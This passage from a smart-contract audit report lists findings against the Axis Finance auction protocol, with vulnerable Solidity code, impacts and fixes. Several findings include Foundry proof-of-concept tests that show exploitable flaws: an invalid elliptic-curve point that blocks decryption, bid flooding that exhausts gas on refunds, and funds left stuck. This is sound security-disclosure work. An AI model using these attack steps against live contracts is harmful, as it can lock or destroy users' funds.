        console2.log("Here is the funding normalized after curator fee is set: ", fundingAfterCuratorFee/1e18);
        console2.log("Balance of base token of the auction house: ", mockBaseToken.balanceOf(address(auctionHouse))/1e18);
        vm.stopPrank();
    }
```

```solidity
Logs:
  Here is the funding normalized before curator fee is set:  75000000000
  Here is the funding normalized after curator fee is set:  1396837485
  Balance of base token of the auction house:  80625000000
```

To run the test use: ``forge test -vvv --mt test_CuratorFeeOverflow``
## Impact
If there is an overflow occurs in the [curate()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L634-L699) function, a big portion of the tokens will be stuck in the ``Axis-Finance`` protocol forever, as there is no way for them to be withdrawn, either by an admin function, or by canceling the auction (if an auction has started, only **FPAM** auctions can be canceled), as the amount returned is calculated in the following way 
```solidity
        if (routing.funding > 0) {
            uint96 funding = routing.funding;

            // Set to 0 before transfer to avoid re-entrancy
            routing.funding = 0;

            // Transfer the base tokens to the appropriate contract
            Transfer.transfer(
                routing.baseToken,
                _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),
                funding,
                false
            );
            ...
        }
```

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L665-L667
## Tool used
Manual review & Foundry

## Recommendation
Either remove the unchecked block
```solidity
unchecked {
   routing.funding += curatorFeePayout;
}
```
so that when overflow occurs, the transaction will revert, or better yet also change the funding variable type from ``uint96`` to ``uint256`` this way sellers can create big enough auctions, and provide sufficient curator fee in order to bootstrap their protocol successfully .

# Issue H-8: It is possible to DoS batch auctions by submitting invalid AltBn128 points when bidding 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/147 

## Found by 
hash, underdog
## Summary

Bidders can submit invalid points for the AltBn128 elliptic curve. The invalid points will make the decrypting process always revert, effectively DoSing the auction process, and locking funds forever in the protocol.

## Vulnerability Detail

Axis finance supports a sealed-auction type of auctions, which is achieved in the Encrypted Marginal Price Auction module by leveraging the ECIES encryption scheme. Axis will specifically use a simplified ECIES implementation that uses the AltBn128 curve, which is a curve with generator point (1,2) and the following formula:

$$
y^2 = x^3 + 3
$$

Bidders will submit encrypted bids to the protocol. One of the parameters required to be submitted by the bidders so that bids can later be decrypted is a public key that will be used in the EMPA decryption process:

```solidity
// EMPAM.sol

function _bid(
        uint96 lotId_, 
        address bidder_,
        address referrer_,
        uint96 amount_,
        bytes calldata auctionData_
    ) internal override returns (uint64 bidId) {
        // Decode auction data 
        (uint256 encryptedAmountOut, Point memory bidPubKey) = 
            abi.decode(auctionData_, (uint256, Point));
 
        ...

        // Check that the bid public key is a valid point for the encryption library
        if (!ECIES.isValid(bidPubKey)) revert Auction_InvalidKey(); 
   
       ...

        return bidId;
    }
```

As shown in the code snippet, bidders will submit a `bidPubKey`, which consists in an x and y coordinate (this is actually the public key, which can be represented as a point with x and y coordinates over an elliptic curve).

The `bidPubKey` point will then be validated by the ECIES library’s `isValid()` function. Essentially, this function will perform three checks:

1. Verify that the point provided is on the AltBn128 curve
2. Ensure the x and y coordinates of the point provided don’t correspond to the generator point (1, 2)
3. Ensure that the x and y coordinates of the point provided don’t corrspond to the point at infinity (0,0)

```solidity
// ECIES.sol

function isOnBn128(Point memory p) public pure returns (bool) {
        // check if the provided point is on the bn128 curve y**2 = x**3 + 3, which has generator point (1, 2)
        return _fieldmul(p.y, p.y) == _fieldadd(_fieldmul(p.x, _fieldmul(p.x, p.x)), 3);
    }
 
    /// @notice Checks whether a point is valid. We consider a point valid if it is on the curve and not the generator point or the point at infinity.
    function isValid(Point memory p) public pure returns (bool) { 
        return isOnBn128(p) && !(p.x == 1 && p.y == 2) && !(p.x == 0 && p.y == 0); 
    }
```

Although these checks are correct, one important check is missing in order to consider that the point is actually a valid point in the AltBn128 curve.

As a summary, ECC incorporates the concept of [finite fields](https://cryptobook.nakov.com/asymmetric-key-ciphers/elliptic-curve-cryptography-ecc#elliptic-curves-over-finite-fields). Essentially, the elliptic curve is considered as a square matrix of size pxp, where p is the finite field (in our case, the finite field defined in Axis’ `ECIES.sol` library is stord in the `FIELD_MODULUS` constant with a value of `21888242871839275222246405745257275088696311157297823662689037894645226208583`). The curve equation then takes this form:

$$
y2 = x^3 + ax + b  (mod p)
$$

Note that because the function is now limited to a field of pxp, any point provided that has an x or y coordinate greater than the modulus will fall outside of the matrix, thus being invalid. In other words, if x > p or y > p, the point should be considered invalid. However, as shown in the previous snippet of code, this check is not performed in Axis’ ECIES implementation. 

This enables a malicious bidder to provide an invalid point with an x or y coordinate greater than the field, but that still passes the checked conditions in the ECIES library. The `isValid()` check will pass and the bid will be successfully submitted, although the public key is theoretically invalid. 

This leads us to the second part of the attack. When the auction concludes, the decryption process will begin. The process consists in:

1. Calling the `decryptAndSortBids()` function. This will trigger the internal `_decryptAndSortBids()` function. It is important to note that this function will only set the status of the auction to `Decrypted` if ALL the bids submitted have been decrypted. Otherwise, the auction can’t continue.
2. `_decryptAndSortBids()` will call the internal `_decrypt()` function for each of the bids submittted
3. `_decrypt()` will finally call the ECIES’ `decrypt()` function so that the bid can be decrypted: 
    
    ```solidity
    // EMPAM.sol
    
    function _decrypt(
            uint96 lotId_,
            uint64 bidId_,
            uint256 privateKey_
        ) internal view returns (uint256 amountOut) {
            // Load the encrypted bid data
            EncryptedBid memory encryptedBid = encryptedBids[lotId_][bidId_];
    
            // Decrypt the message
            // We expect a salt calculated as the keccak256 hash of lot id, bidder, and amount to provide some (not total) uniqueness to the encryption, even if the same shared secret is used
            Bid storage bidData = bids[lotId_][bidId_];
            uint256 message = ECIES.decrypt(
                encryptedBid.encryptedAmountOut,
                encryptedBid.bidPubKey, 
                privateKey_, 
                uint256(keccak256(abi.encodePacked(lotId_, bidData.bidder, bidData.amount))) // @audit-issue [MEDIUM] - Missing bidId in salt creates the edge case where a bid susceptible of being discovered if a user places two bids with the same input amount. Because the same key will be used when performing the XOR, the symmetric key can be extracted, thus potentially revealing the bid amounts.
            ); 
       
            
            ...
        } 
    ```
    
    As shown in the code snippet, one of the parameters passed to the `ECIES.decrypt()`  function will be the `encryptedBid.bidPubKey` (the invalid point provided by the malicious bidder). As we can see, the first step performed by `ECIES.decrypt()` will be to call the `recoverSharedSecret()` function, passing the invalid public key (`ciphertextPubKey_`) and the auction’s global `privateKey_` as parameter:
    
    ```solidity
    // ECIES.sol
    
    function decrypt(
            uint256 ciphertext_,
            Point memory ciphertextPubKey_,
            uint256 privateKey_,
            uint256 salt_
        ) public view returns (uint256 message_) {
            // Calculate the shared secret
            // Validates the ciphertext public key is on the curve and the private key is valid
            uint256 sharedSecret = recoverSharedSecret(ciphertextPubKey_, privateKey_);
    
            ...
        }
        
      function recoverSharedSecret(
            Point memory ciphertextPubKey_,
            uint256 privateKey_
        ) public view returns (uint256) {
    	      ...
    	      
            Point memory p = _ecMul(ciphertextPubKey_, privateKey_);
    
            return p.x;
        }
        
       function _ecMul(Point memory p, uint256 scalar) private view returns (Point memory p2) {
            (bool success, bytes memory output) =
                address(0x07).staticcall{gas: 6000}(abi.encode(p.x, p.y, scalar));
    
            if (!success || output.length == 0) revert("ecMul failed.");
    
            p2 = abi.decode(output, (Point));
        }
    ```
    

Among other things, `recoverSharedSecret()` will execute a scalar multiplication between the invalid public key and the global private key via the `ecMul` precompile. This is where the denial of servide will take place.

The ecMul precompile contract was incorporated in [EIP-196](https://eips.ethereum.org/EIPS/eip-196). Checking the EIP’s [exact semantics section](https://eips.ethereum.org/EIPS/eip-196#exact-semantics), we can see that inputs will be considered invalid if “… any of the field elements (point coordinates) is equal or larger than the field modulus p, the contract fails”. Because the point submitted by the bidder had one of the x or y coordinates bigger than the field modulus p (because Axis never validated that such value was smaller than the field), the call to the ecmul precompile will fail, reverting with the “ecMul failed.” error.

Because the decryption process expects ALL the bids submitted for an auction to be decrypted prior to actually setting the auctions state to `Decrypted`, if only one bid decryption fails, the decryption process won’t be completed, and the whole auction process (decrypting, settling, …) won’t be executable because the auction never reaches the `Decrypted` state.

## Proof of Concept

The following proof of concept shows a reproduction of the attack mentioned above. In order to reproduce it, following these steps:

1. Inside `EMPAModuleTest.sol`, change the `_createBidData()` function so that it uses the (21888242871839275222246405745257275088696311157297823662689037894645226208584, 2) point instead of the `_bidPublicKey` variable. This is a valid point as per Axis’ checks, but it is actually invalid given that the x coordinate is greater than the field modulus:
    
    ```diff
    // EMPAModuleTest.t.sol
    
    function _createBidData(
            address bidder_,
            uint96 amountIn_,
            uint96 amountOut_
        ) internal view returns (bytes memory) {
            uint256 encryptedAmountOut = _encryptBid(_lotId, bidder_, amountIn_, amountOut_);
     
    -        return abi.encode(encryptedAmountOut, _bidPublicKey);
    +        return abi.encode(encryptedAmountOut, Point({x: 21888242871839275222246405745257275088696311157297823662689037894645226208584, y: 2}));
        }        
    
    ```
    
2. Paste the following code in `moonraker/test/modules/auctions/EMPA/decryptAndSortBids.t.sol`:
    
    ```solidity
    // decryptAndSortBids.t.sol
    
    function testBugdosDecryption()
            external
            givenLotIsCreated
            givenLotHasStarted
            givenBidIsCreated(_BID_AMOUNT, _BID_AMOUNT_OUT) 
            givenBidIsCreated(_BID_AMOUNT, _BID_AMOUNT_OUT) 
            givenLotHasConcluded  
            givenPrivateKeyIsSubmitted
        {
    
            vm.expectRevert("ecMul failed.");
            _module.decryptAndSortBids(_lotId, 1);
    
        }
    ```
    
3. Run the test inside `moonraker` with the following command: `forge test --mt testBugdosDecryption`

## Impact

High. A malicious bidder can effectively DoS the decryption process, which will prevent all actions in the protocol from being executed. This attack will make all the bids and prefunded auction funds remain stuck forever in the contract, because all the functions related to the post-concluded auction steps expect the bids to be first decrypted.

## Code Snippet

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L250

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/ECIES.sol#L138

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/ECIES.sol#L133

## Tool used

Manual Review, foundry

## Recommendation

Ensure that the x and y coordinates are smaller than the field modulus inside the `ECIES.sol` `isValid()` function, adding the `p.x < FIELD_MODULUS && p.y < FIELD_MODULUS` check so that invalid points can’t be submitted:

```diff
// ECIES.sol

function isValid(Point memory p) public pure returns (bool) { 
-        return isOnBn128(p) && !(p.x == 1 && p.y == 2) && !(p.x == 0 && p.y == 0); 
+        return isOnBn128(p) && !(p.x == 1 && p.y == 2) && !(p.x == 0 && p.y == 0) && (p.x < FIELD_MODULUS && p.y < FIELD_MODULUS); 
   }
```



## Discussion

**0xJem**

Duplicate of https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/185

# Issue H-9: Downcasting to uint96 can cause assets to be lost for some tokens 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/181 

## Found by 
FindEverythingX, hash, pseudoArtist
## Summary
Downcasting to uint96 can cause assets to be lost for some tokens

## Vulnerability Detail

After summing the individual bid amounts, the total bid amount is downcasted to uint96 without any checks

```solidity
            settlement_.totalIn = uint96(result.totalAmountIn);
```

uint96 can be overflowed for multiple well traded tokens:

Eg:

shiba inu :
current price = $0.00003058
value of type(uint96).max tokens ~= 2^96 * 0.00003058 / 10^18 == 2.5 million $

Hence auctions that receive more than type(uint96).max amount of tokens will be downcasted leading to extreme loss for the auctioner

## Impact

The auctioner will suffer extreme loss in situations where the auctions bring in >uint96 amount of tokens

## Code Snippet

downcasting totalAmountIn to uint96
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L825

## Tool used

Manual Review

## Recommendation

Use a higher type or warn the user's of the limitations on the auction sizes



## Discussion

**0xJem**

Duplicate of #34 

**Oighty**

Pretty similar to #209. Might be a duplicate.

**nevillehuang**

Agree both hinges on a high `totalAmountIn`

# Issue H-10: Incorrect `prefundingRefund` calculation will disallow claiming 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/187 

## Found by 
ether\_sky, hash, joicygiore
## Summary
Incorrect `prefundingRefund` calculation will lead to underflow and hence disallowing claiming

## Vulnerability Detail

The `prefundingRefund` variable calculation inside the `claimProceeds` function is incorrect

```solidity
    function claimProceeds(
        uint96 lotId_,
        bytes calldata callbackData_
    ) external override nonReentrant {
        
        ...

        (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =
            _getModuleForId(lotId_).claimProceeds(lotId_);

        ....

        // Refund any unused capacity and curator fees to the address dictated by the callbacks address
        // By this stage, a partial payout (if applicable) and curator fees have been paid, leaving only the payout amount (`totalOut`) remaining.
        uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;
        unchecked {
            routing.funding -= prefundingRefund;
        }
```

Here `sold` is the total base quantity that has been sold to the bidders. Unlike required, the `routing.funding` variable need not be holding `capacity + (0,curator fees)` since it is decremented every time a payout of a bid is claimed

```solidity
    function claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {
        
        ....

            if (bidClaim.payout > 0) {
 
                ...

                // Reduce funding by the payout amount
                unchecked {
                    routing.funding -= bidClaim.payout;
                }
```

### Example
Capacity = 100 prefunded, hence routing.funding == 100 initially
Sold = 90 and no partial fill/curation
All bidders claim before the claimProceed function is invoked
Hence routing.funding = 100 - 90 == 10
When claimProceeds is invoked, underflow and revert:

uint96 prefundingRefund = routing.funding + payoutSent_ - sold_ == 10 + 0 - 90

## Impact

Claim proceeds function is broken. Sellers won't be able to receive the proceedings

## Code Snippet

wrong calculation
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/AuctionHouse.sol#L604

## Tool used

Manual Review

## Recommendation

Change the calculation to:
```solidity
uint96 prefundingRefund = capacity - sold_ + curatorFeesAdjustment (how much was prefunded initially - how much will be sent out based on capacity - sold)
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/111.

# Issue M-1: Attacker can forbid users to get refunded if sends enough bids on the EMPAM module 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/41 

## Found by 
0xR360, 0xmuxyz, FindEverythingX, shaka
## Summary

When an auction starts an attacker can send enough encrypted bids to make future users that bid unable to be refunded.

## Vulnerability Detail

An attacker can send valid bids with amounts equal to the minimum allowed amount for a bid. If enough bids are sent, users that bid after him won't be able to get refunded if they want to. Scenario:

- Attacker sends lots of bids just after auction creation.
- User sends bids
- User wants to refund some of them: The _refundBid function on the EMPAM module loops through all the bids to find the requested one, then pops it out of the decryption array. If there are too many bids before the one we are looking fur, gas can run out.

## Impact
Breaks the refund functionality. User won't be able to refund bid. Possible loss of funds.

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L284-L305

Putting this test on the EMPA refund bid [tests](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/test/modules/auctions/EMPA/refundBid.t.sol) file can show how its performed.

```solidity
    function test_audit_dos_bids() public givenLotIsCreated givenLotHasStarted givenBidIsCreated(2e18, 1e18){
        uint bidNums = 60000;
        //worst case scenario for attack is: max limit for block, only tx in the block. This doesnt take in account the gas spent on entrypoint.
        uint ETH_GAS_LIMIT = 30_000_000;

        // attacker bids
        for (uint i=0;i < bidNums; i++)
            _createBid(1e18, 1e18); //amount can be as small as possible

        uint64 normalUserBid = _createBid(2e18, 1e18);
        uint256 gasBefore = gasleft();

        vm.prank(address(_auctionHouse));
        uint256 refundAmount = _module.refundBid(_lotId, normalUserBid, _BIDDER);
        uint256 gasAfter = gasleft();

        uint256 gasUsed = gasBefore - gasAfter;
        assertEq(gasUsed > ETH_GAS_LIMIT,true, "out of gas");
    }
```

## Tool used

Manual Review

## Recommendation

Instead of looping through each bidId, holding the index position of a non encrypted bid on a mapping should solve it.
The mapping should be from bidId to its position in the array. When a bid is refunded, this position should also be changed for its replacement.



## Discussion

**nevillehuang**

Believe #41 and #237 to not be duplicates based on different fix and code logic involved:

> The fix isn't the same because we need to remove a loop from the refundBid function. The settle fix involves refactoring to allow a multi-txn process or decreasing the gas cost of it. Not really a good way to remove the loop from settle

# Issue M-2: The auction creator has control over the auction process. 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/80 

## Found by 
ether\_sky
## Summary
While no one should have control over an ongoing `auction`, the `auction creator`, who possesses the `private key`, can influence the `auction` by decrypting the `bid` information.
Unfortunately, this can result in several undesirable outcomes.
## Vulnerability Detail
During the `auctions`, the `creators` can access and decrypt `bids` using the `private key`.
Consequently, they gain insight into the ongoing `auctions'` status.
The `auction creator` can have several chocies.
1. `Aggressive Bidding`.
If the `creator` believes that `bidders'` prices are insufficient, they can place a `bid` at the highest price.
While this may result in some loss, it allows them to pay `fees` in `quote` tokens while preserving `base` tokens.
`Bidders`, however, can not acquire `base` tokens.
2. `Strategic Bidding`
Alternatively, the `creator` can `bid` at an appropriate price for optimal results.
For instance, consider `bids (q1, p1), (q2, p2), (q3, p3) ...` where `p1 > p2 > p3`.
if `q1 + q2` doesn't fill the `capacity`, the `auction` involves the third `bid`, and the `marginal price` falls to `p3`.
Suppose the `creator` desires `quote` tokens at price `p2`: he can create a `bid` with price `p2` and `quote` tokens to fill the `capacity`.
Consequently, he can acquire `q1 + q2` tokens at price `p2`.
3. `Mitigating Failure`
If `quote` amounts fall short of the required amounts, the `auction` is considered unsuccessful,.
```solidity
function _settle(uint96 lotId_)
    internal
    override
    returns (Settlement memory settlement_, bytes memory auctionOutput_)
{
    if (
        result.capacityExpended >= auctionData[lotId_].minFilled
            && result.marginalPrice >= lotAuctionData.minPrice
    ) { }
}
```
To prevent this, the `auction creator` can create a `bid` with a small amount of `quote` tokens to fill the `auction`.
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L791-L794
## Tool used

Manual Review

## Recommendation
```solidity
- mapping(uint96 lotId => mapping(uint64 bidId => EncryptedBid)) public encryptedBids;
+ mapping(uint96 lotId => mapping(uint64 bidId => EncryptedBid)) private encryptedBids;
```



## Discussion

**Oighty**

The key assumption here is that the seller (auction creator) has the private key that corresponds to the public key for the auction, but that doesn't necessarily have to be case. Axis has implemented a key management service that provides a new BN254 public key to a user, stores the private key, and then releases the key to anyone who calls the API after the auction ends. Similarly, multi-party computation (MPC) protocols are being built that could do this in a decentralized way, e.g. Lit Protocol.

I agree that the seller could have the private key and the scenarios you lay out are plausible, but it depends on external factors, including where the key is held. We can't enforce using a key-pair that the seller doesn't have custody of, but we can encourage it through the off-chain tooling we provide for use in auctions.

# Issue M-3: If pfBidder gets blacklisted the settlement process would be broken and every other bidders and the seller would lose their funds 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/90 

## Found by 
Avci, Aymen0909, FindEverythingX, bhilare\_, jecikpo, merlin, poslednaya, seeques
## Summary
During batch auction settlement, the bidder whos bid was partially filled gets the refund amount in quote tokens and his payout in base immediately. In case if quote or base is a token with blacklisted functionality (e.g. USDC) and bidder's account gets blacklisted after the bid was submitted, the settlement would be bricked and all bidders and the seller would lose their tokens/proceeds.
## Vulnerability Detail
In the `AuctionHouse.settlement()` function there is a check if the bid was partially filled, in which case the function handles refund and payout immediately:
```solidity
            // Check if there was a partial fill and handle the payout + refund
            if (settlement.pfBidder != address(0)) {
                // Allocate quote and protocol fees for bid
                _allocateQuoteFees(
                    feeData.protocolFee,
                    feeData.referrerFee,
                    settlement.pfReferrer,
                    routing.seller,
                    routing.quoteToken,
                    // Reconstruct bid amount from the settlement price and the amount out
                    uint96(
                        Math.mulDivDown(
                            settlement.pfPayout, settlement.totalIn, settlement.totalOut
                        )
                    )
                );

                // Reduce funding by the payout amount
                unchecked {
                    routing.funding -= uint96(settlement.pfPayout);
                }

                // Send refund and payout to the bidder
                //@audit if pfBidder gets blacklisted the settlement is broken
                Transfer.transfer(
                    routing.quoteToken, settlement.pfBidder, settlement.pfRefund, false
                );

                _sendPayout(settlement.pfBidder, settlement.pfPayout, routing, auctionOutput);
            }
```
If `pfBidder` gets blacklisted after he submitted his bid, the call to `settle()` would revert. There is no way for other bidders to get a refund for the auction since settlement can only happen after auction conclusion but the `refundBid()` function needs to be called before the conclusion:
```solidity
    function settle(uint96 lotId_)
        external
        virtual
        override
        onlyInternal
        returns (Settlement memory settlement, bytes memory auctionOutput)
    {
        // Standard validation
        _revertIfLotInvalid(lotId_);
        _revertIfBeforeLotStart(lotId_);
        _revertIfLotActive(lotId_); //@audit
        _revertIfLotSettled(lotId_);
        
       ...
}
```
```solidity
    function refundBid(
        uint96 lotId_,
        uint64 bidId_,
        address caller_
    ) external override onlyInternal returns (uint96 refund) {
        // Standard validation
        _revertIfLotInvalid(lotId_);
        _revertIfBeforeLotStart(lotId_);
        _revertIfBidInvalid(lotId_, bidId_);
        _revertIfNotBidOwner(lotId_, bidId_, caller_);
        _revertIfBidClaimed(lotId_, bidId_);
        _revertIfLotConcluded(lotId_); //@audit

        // Call implementation-specific logic
        return _refundBid(lotId_, bidId_, caller_);
    }
```
Also, the `claimBids` function would also revert since the lot wasn't settled and the seller wouldn't be able to get his prefunding back since he can neither `cancel()` the lot nor `claimProceeds()`.
## Impact
Loss of funds
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L503-L529
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L501-L516
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L589-L600
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L733-L741
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L885-L891
## Tool used

Manual Review

## Recommendation
Separate the payout and refunding logic for pfBidder from the settlement process.



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/119.

# Issue M-4: BlastAuctionHouse contract has wrong WETH and USDB addresses as immutables which leads to lost yield 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/91 

## Found by 
Angry\_Mustache\_Man, FindEverythingX, cryptic, enfrasico, hash, seeques, underdog, web3tycoon, yotov721
## Summary
The `BlastAuctionHouse` contract has WETH and USDB addresses as constants assigned to the WETH and USDB testnet addresses. In blast developer documentation:
```solidity
contract MyContract {
  // NOTE: these addresses differ on the Blast mainnet and testnet; the lines below are the mainnet addresses
  IERC20Rebasing public constant USDB = IERC20Rebasing(0x4300000000000000000000000000000000000003);
  IERC20Rebasing public constant WETH = IERC20Rebasing(0x4300000000000000000000000000000000000004);
  // NOTE: the commented lines below are the testnet addresses
  // IERC20Rebasing public constant USDB = IERC20Rebasing(0x4200000000000000000000000000000000000022);
  // IERC20Rebasing public constant WETH = IERC20Rebasing(0x4200000000000000000000000000000000000023);
```
In the `BlastAuctionHouse` contract:
```solidity
    /// @notice    Blast contract for claiming gas fees
    IBlast internal constant _BLAST = IBlast(0x4300000000000000000000000000000000000002);

    /// @notice    Address of the WETH contract on Blast
    IERC20Rebasing internal constant _WETH =
        IERC20Rebasing(0x4200000000000000000000000000000000000023); //@audit this is a testnet addresses
        
    /// @notice    Address of the USDB contract on Blast
    IERC20Rebasing internal constant _USDB =
        IERC20Rebasing(0x4200000000000000000000000000000000000022); //@audit

```
This may result in unexpected behavior in smart contracts. If the constructor wouldn't revert, then at worst the yield for WETH and USDB would be lost.
## Vulnerability Detail
See summary
## Impact
DoS of contract creation or lost yield
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/blast/BlastAuctionHouse.sol#L32-L44
## Tool used

Manual Review

## Recommendation
Check for the correct addresses at:
https://docs.blast.io/building/guides/weth-yield



## Discussion

**Oighty**

Duplicate of #73 

# Issue M-5: Unsold tokens from a FPAM auction, will be stuck in the protocol, after the auction concludes 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/94 

## Found by 
Aymen0909, FindEverythingX, cu5t0mPe0, dimulski, ether\_sky, hash, jecikpo, qbs, seeques, ydlee
## Summary
The ``Axis-Finance`` protocol allows sellers to create two types of auctions: **FPAM** & **EMPAM**. An **FPAM** auction allows sellers to set a price, and a maxPayout, as well as create a prefunded auction. The seller of a **FPAM** auction can cancel it while it is still active by calling the [cancel](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L301-L342) function which in turn calls the [cancelAuction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L351-L364) function. If the auction is prefunded, and canceled while still active, all remaining funds will be transferred back to the seller. The problem arises if an **FPAM** prefunded auction is created, not all of the prefunded supply is bought by users, and the auction concludes. There is no way for the ``baseTokens`` still in the contract, to be withdrawn from the protocol, and they will be forever stuck in the ``Axis-Finance`` protocol. As can be seen from the below code snippet [cancelAuction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L351-L364) function checks if an auction is concluded, and if it is the function reverts.

```solidity
    function _revertIfLotConcluded(uint96 lotId_) internal view virtual {
        // Beyond the conclusion time
        if (lotData[lotId_].conclusion < uint48(block.timestamp)) {
            revert Auction_MarketNotActive(lotId_);
        }

        // Capacity is sold-out, or cancelled
        if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);
    }
```
## Vulnerability Detail
[Gist](https://gist.github.com/AtanasDimulski/a47112fc7ae473fd69b42ba997819726)
After following the steps in the above mentioned [gist](https://gist.github.com/AtanasDimulski/a47112fc7ae473fd69b42ba997819726) add the following test to the ``AuditorTests.t.sol`` file

```solidity
function test_FundedPriceAuctionStuckFunds() public {
        vm.startPrank(alice);
        Veecode veecode = fixedPriceAuctionModule.VEECODE();
        Keycode keycode = keycodeFromVeecode(veecode);
        bytes memory _derivativeParams = "";
        uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens
        mockBaseToken.mint(alice, lotCapacity);
        mockBaseToken.approve(address(auctionHouse), type(uint256).max);

        FixedPriceAuctionModule.FixedPriceParams  memory myStruct = FixedPriceAuctionModule.FixedPriceParams({
            price: uint96(1e18), 
            maxPayoutPercent: uint24(1e5)
        });

        Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({
            auctionType: keycode,
            baseToken: mockBaseToken,
            quoteToken: mockQuoteToken,
            curator: curator,
            callbacks: ICallback(address(0)),
            callbackData: abi.encode(""),
            derivativeType: toKeycode(""),
            derivativeParams: _derivativeParams,
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory paramsA = Auction.AuctionParams({
            start: 0,
            duration: 1 days,
            capacityInQuote: false,
            capacity: lotCapacity,
            implParams: abi.encode(myStruct)
        });

        string memory infoHashA;
        auctionHouse.auction(routingA, paramsA, infoHashA);       
        vm.stopPrank();

        vm.startPrank(bob);
        uint96 fundingBeforePurchase;
        uint96 fundingAfterPurchase;
        (,fundingBeforePurchase,,,,,,,) = auctionHouse.lotRouting(0);
        console2.log("Here is the funding normalized before purchase: ", fundingBeforePurchase/1e18);
        mockQuoteToken.mint(bob, 10_000_000_000e18);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        Router.PurchaseParams memory purchaseParams = Router.PurchaseParams({
            recipient: bob,
            referrer: address(0),
            lotId: 0,
            amount: 10_000_000_000e18,
            minAmountOut: 10_000_000_000e18,
            auctionData: abi.encode(0),
            permit2Data: ""
        });
        bytes memory callbackData = "";
        auctionHouse.purchase(purchaseParams, callbackData);
        (,fundingAfterPurchase,,,,,,,) = auctionHouse.lotRouting(0);
        console2.log("Here is the funding normalized after purchase: ", fundingAfterPurchase/1e18);
        console2.log("Balance of seler of quote tokens: ", mockQuoteToken.balanceOf(alice)/1e18);
        console2.log("Balance of bob in base token: ", mockBaseToken.balanceOf(bob)/1e18);
        console2.log("Balance of auction house in base token: ", mockBaseToken.balanceOf(address(auctionHouse)) /1e18);
        skip(86401);
        vm.stopPrank();

        vm.startPrank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(Auction.Auction_MarketNotActive.selector, 0)
        );
        auctionHouse.cancel(uint96(0), callbackData);
        vm.stopPrank();
    }
```

```solidity
Logs:
  Here is the funding normalized before purchase:  75000000000
  Here is the funding normalized after purchase:  65000000000
  Balance of seler of quote tokens:  10000000000
  Balance of bob in base token:  10000000000
  Balance of auction house in base token:  65000000000
```

To run the test use: ``forge test -vvv --mt test_FundedPriceAuctionStuckFunds``
## Impact
If a prefunded **FPAM** auction concludes and there are still tokens, not bought from the users, they will be stuck in the ``Axis-Finance`` protocol.

## Code Snippet

## Tool used
Manual Review & Foundry

## Recommendation
Implement a function, that allows sellers to withdraw the amount left for a prefunded **FPAM** auction they have created, once the auction has concluded. 

# Issue M-6: Curator can inflate fee right before accepting an invitation for an auction 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/111 

## Found by 
flacko, ydlee
## Summary
A curator can inflate their fee to a higher one than promoted to an auction's seller right before accepting the invitation to curate the auction and thus charging the seller more and incurring unexpected costs for them.
## Vulnerability Detail
> In the contest's README there is no mention of the Curator role, so it is to be considered RESTRICTED.

When a seller is creating an auction, they specify the address of the curator of their auction once and for all.

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L215C1-L220C10
```solidity
        // Store curation information
        {
            FeeData storage fees = lotFees[lotId];
            fees.curator = routing_.curator;
            fees.curated = false;
        }
```

